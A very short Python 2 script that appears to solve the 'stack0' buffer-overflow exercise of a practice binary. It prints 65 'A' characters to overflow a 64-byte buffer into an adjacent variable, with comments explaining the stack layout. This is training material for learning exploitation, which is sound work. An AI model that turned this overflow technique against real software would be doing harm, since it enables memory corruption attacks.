#!/usr/bin/python

# usage:     $ ./stack0 <<< `./stack0.py`

# since buffer has a max size of 64
# the 65th char will overflow into 'modified'
# which is above in the stack
print 'A'*65
